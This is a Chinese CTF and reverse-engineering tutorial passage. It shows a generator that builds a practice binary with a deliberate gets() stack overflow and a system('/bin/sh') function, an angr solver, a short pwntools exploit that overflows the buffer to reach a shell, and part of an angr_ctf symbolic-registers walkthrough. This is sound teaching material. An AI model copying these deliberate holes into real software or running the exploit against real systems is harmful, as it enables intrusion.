
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97  98  99  100  101  102  103  104  105  106  107  108  109 | `${`  `import` `random, os`  `random.seed(os.urandom(``8``))`  `userdef_charset` `=` `'ABCDEFGHIJKLMNOPQRSTUVWXYZ'`  `userdef` `=` `''.join(random.choice(userdef_charset)` `for` `_` `in` `range``(``8``))` `# 随机选取8个字母当作userdef，也就是最后输入要比较的字符串`    `def` `check_string_recursive(array0, array1, random_list, bit):`  `if` `bit <` `0``:`  `write(``'aas(%s, %s);'` `%` `(array0, array1))`  `else``:`  `if` `random_list[``0``]:` `# 如果随机boolean列表第一个元素为True`  `write(``'if (CHECK_BIT(%s, %d) == CHECK_BIT(%s, %d)) {'` `%` `(array0, bit, array1, bit))`  `check_string_recursive(array0, array1, random_list[``1``:], bit``-``1``)` `# 递归调用`  `write(``'} else { aaz(); '``)`  `check_string_recursive(array0, array1, random_list[``1``:], bit``-``1``)` `# 将should_succeed设置为0之后再递归调用`  `write(``'}'``)`  `else``:` `# 如果随机boolean列表第一个元素为False`  `write(``'if (CHECK_BIT(%s, %d) != CHECK_BIT(%s, %d)) { aaz();'` `%` `(array0, bit, array1, bit))`  `check_string_recursive(array0, array1, random_list[``1``:], bit``-``1``)` `# 将should_succeed设置为0之后再递归调用`  `write(``'} else { '``)`  `check_string_recursive(array0, array1, random_list[``1``:], bit``-``1``)` `# 递归调用`  `write(``'}'``)`  `}$`    `#define _GNU_SOURCE`  `#include <stdio.h>`  `#include <stdlib.h>`  `#include <string.h>`  `#include <unistd.h>`  `#include <stdint.h>`    `#define USERDEF "${ userdef }$"`` ` #define LEN_USERDEF ${ write(len(userdef)) }$``    `/``/` `return` `true` `if` `nth bit of array` `is` `1`  `#define CHECK_BIT(array, bit_index) (!!(((uint8_t*) array)[bit_index / 8] & (((uint8_t) 0x1) << (bit_index % 8))))`    `char msg[]` `=`  `"${ description }$"``;`    `uint8_t should_succeed` `=` `1``;`    `void print_msg() {`  `printf(``"%s"``, msg);`  `}`    `int` `complex_function(``int` `value,` `int` `i) {` `/``/` `。。。复杂运算，直接就遍历出来了，应该改复杂一些的`  `#define LAMBDA 5`  `if` `(!(``'A'` `<``=` `value && value <``=` `'Z'``)) {`  `printf(``"Try again.\n"``);`  `exit(``1``);`  `}`  `return` `((value` `-` `'A'` `+` `(LAMBDA` `*` `i))` `%` `(``'Z'` `-` `'A'` `+` `1``))` `+` `'A'``;`  `}`    `void aaz() {`  `should_succeed` `=` `0``;`  `}`    `void get_sh(){`  `system(``"/bin/sh"``);`  `}`    `int` `login_again() {`  `setbuf(stdout, NULL);`  `setbuf(stderr, NULL);`  `setbuf(stdin, NULL);`    `char pwd[``64``];`  `printf(``"Enter the password again: "``);`  `gets(&pwd);` `/``/` `栈溢出`  `if``(strcmp(pwd,``"deadbeef"``)` `=``=` `0``){`  `puts(``"I think you can't get shell"``);`  `}``else``{`  `puts(``"Error."``);`  `}`  `return` `0``;`  `}`    `void aas(char``*` `compare0, char``*` `compare1) {`  `if` `(should_succeed && !strncmp(compare0, compare1,` `8``)) {` `/``/` `如果should_succeed为真，且进行复杂运算之后的输入和userdef相等，就进入下一步`  `login_again();`  `}` `else` `{`  `printf(``"Error.\n"``);`  `}`  `}`    `int` `main(``int` `argc, char``*` `argv[]) {`    `char` `buffer``[``20``];`  `char password[``20``];`    `/``/``print_msg();`    `for` `(``int` `i``=``0``; i <` `20``;` `+``+``i) {`  `password[i]` `=` `0``;`  `}`    `strncpy(password, USERDEF, LEN_USERDEF);` `/``/` `password` `=` `USERDEF，最后要和输入比较的字符串`    `printf(``"Enter the password: "``);` `/``/` `输入`  `scanf(``"%8s"``,` `buffer``);`    `for` `(``int` `i``=``0``; i<LEN_USERDEF;` `+``+``i) {` `/``/` `对输入进行复杂运算`  `buffer``[i]` `=` `(char) complex_function(``buffer``[i], i);`  `}`  `/``/` `递归调用，也就是这里生成很多函数`  `${ check_string_recursive(``'buffer'``,` `'password'``, random_list,` `12``) }$`  `}` |

运行生成二进制文件：

|  |  |

| --- | --- |

| 1 | `python generate.py` `123` `auto` |

![image-20210630161445362](https://bbs.kanxue.com/upload/attach/202107/830671_6FD39VRDPWZK9QV.jpg)

利用：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22 | `# auto_angr.py`  `import` `angr`  `import` `sys`    `def` `main(argv):`  `path_to_binary` `=` `'./auto2'`  `project` `=` `angr.Project(path_to_binary)`  `initial_state` `=` `project.factory.entry_state()`  `simulation` `=` `project.factory.simgr(initial_state)`    `success_address` `=` `0x0804874A`  `will_not_succeed_address` `=` `0x08048658`  `simulation.explore(find``=``success_address, avoid``=``will_not_succeed_address)`    `if` `simulation.found:`  `solution_state` `=` `simulation.found[``0``]`  `print``(solution_state.posix.dumps(sys.stdin.fileno()))`  `else``:`  `raise` `Exception(``'Could not find the solution'``)`    `if` `__name__` `=``=` `'__main__'``:`  `main(sys.argv)` |

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12 | `# auto_exp.py`  `from` `pwn` `import` `*`  `#context.log_level = 'debug'`  `p` `=` `process(``'./auto'``)`    `#p = remote('127.0.0.1',10001)`  `p.recvuntil(``'password: \n'``)`  `p.send(``'UXYUKVNZ'``)`  `p.recvuntil(``'again: \n'``)`  `p.sendline(b``'a'``*``0x4c` `+` `p32(``0x08048665``))`  `p.recvline()`  `p.interactive()` |

![image-20210630162649656](https://bbs.kanxue.com/upload/attach/202107/830671_K5RS2NXMDS372NK.jpg)

![image-20210630162729174](https://bbs.kanxue.com/upload/attach/202107/830671_THPYEYXGS6EU6E4.jpg)

下面继续以前写了一半就丢一边的其他题目。

## 03\_angr\_symbolic\_registers

### 步骤一：查看文件属性和检查安全机制

- 32位程序

- 关闭了PIE

![image-20210102183600870](https://bbs.kanxue.com/upload/attach/202107/830671_HG8X6T6QRJGNQJS.jpg)

### 步骤二：IDA静态分析

分析完后发现程序的功能是：以十六进制格式输入3个值，然后分别对他们做不同的复杂运算，最后判断三个复杂运算的结果，如果都为假，那么会打印“Good Job.”。

![image-20210102185155416](https://bbs.kanxue.com/upload/attach/202107/830671_9AMR522GBXUBWN7.jpg)

那是怎么判断出传入`complex_function1`、`complex_function2`、`complex_function3` 的参数是输入的三个变量的呢？首先来看一看要求以十六进制格式输入三个值的输入函数`get_user_input`：

![image-20210102185656396](https://bbs.kanxue.com/upload/attach/202107/830671_FG3SNQ2UFG4UM2N.jpg)

然后，`main`函数中的`v4`是`get_user_input`函数的返回值，很明显就是第一个输入值了。main函数中的`v3`由上方声明处的注释可知是`ebx`的值，`v6`由`v5`赋值，是`edx`的值。都是寄存器中值，那就说明它们的值不是预先定义好，猜测是对应输入函数get\_user\_input里的v2和v3，那么去查看输入函数get\_user\_input的汇编代码。输入之后，分别把输入值先后赋值给了eax、ebx和edx，刚好对应main函数的v4、v3和v6。

![image-20210102190505083](https://bbs.kanxue.com/upload/attach/202107/830671_SF9YGY537DSTRA7.jpg)

接着，我们想想怎么解题。这一题和前面的题目最大的不同就是要符号化输入，前面三题之所以没有对输入进行符号化是因为输入很简单，angr自动对其进行符号化了，以便输入函数将符号值注入到寄存器中。这一题因为输入scanf函数中的格式化字符串更复杂，目前angr不支持从scanf函数读取多个值，所以需要我们往寄存器中手动注入符号。

![image-20210102213430758](https://bbs.kanxue.com/upload/attach/202107/830671_CSU9VGDT9SPM75A.jpg)

本题就需要对这三个寄存器进行注入，并且告诉模拟引擎在scanf函数之后开始。

![image-20210102212325874](https://bbs.kanxue.com/upload/attach/202107/830671_SCHMKKVTF66SBDU.jpg)

结合汇编代码如下图所示。

![image-20210102213236563](https://bbs.kanxue.com/upload/attach/202107/830671_V9UPGZSG53HZPU4.jpg)

开始地址是：0x80488d1

![image-20210102213916953](https://bbs.kanxue.com/upload/attach/202107/830671_ETBAFCPFJMR4S2Z.jpg)

> 当输入复杂，需要手动注入符号值的几个情况：
>
> - scanf的格式化字符串复杂
> - 输入来自文件
> - 输入来自网络
> - 输入来自UI交互

### 步骤三：使用angr解题

|  |  |

| --- | --- |
